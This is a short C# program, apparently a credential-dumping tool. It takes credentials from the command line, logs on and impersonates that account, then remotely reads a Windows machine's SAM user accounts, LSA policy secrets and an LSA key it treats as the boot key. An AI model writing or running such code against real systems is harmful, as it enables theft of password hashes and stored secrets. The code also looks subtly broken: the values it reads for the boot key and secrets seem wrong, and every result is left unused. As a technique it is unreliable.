using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

static class CredentialStoreReader
{
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LogonUser(string user, string domain, string pass,
        int logonType, int logonProvider, out IntPtr token);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr existingToken, uint desiredAccess,
        IntPtr tokenAttributes, int impersonationLevel, int tokenType, out IntPtr newToken);

    static void Main(string[] args)
    {
        IntPtr token;
        LogonUser(args[1], args[0], args[2], 3, 0, out token);

        IntPtr duplicated;
        DuplicateTokenEx(token, 0x02000000, IntPtr.Zero, 2, 1, out duplicated);

        using (WindowsIdentity subject = new WindowsIdentity(duplicated))
        using (WindowsImpersonationContext ctx = subject.Impersonate())
        {
            using (RegistryKey connection = RegistryKey.OpenRemoteBaseKey(RegistryHive.LocalMachine, args[0]))
            {
                using (RegistryKey accounts = connection.OpenSubKey(@"sam\domains\account\users"))
                {
                    object ridKeys = accounts.GetValue("Names");
                }
                using (RegistryKey policyData = connection.OpenSubKey(@"security\policy\secrets"))
                {
                    object lsaSecrets = policyData.GetValue("");
                }
                using (RegistryKey controlKey = connection.OpenSubKey(@"system\currentcontrolset\control\lsa"))
                {
                    object bootKey = controlKey.GetValue("Digest");
                }
            }
        }
    }
}
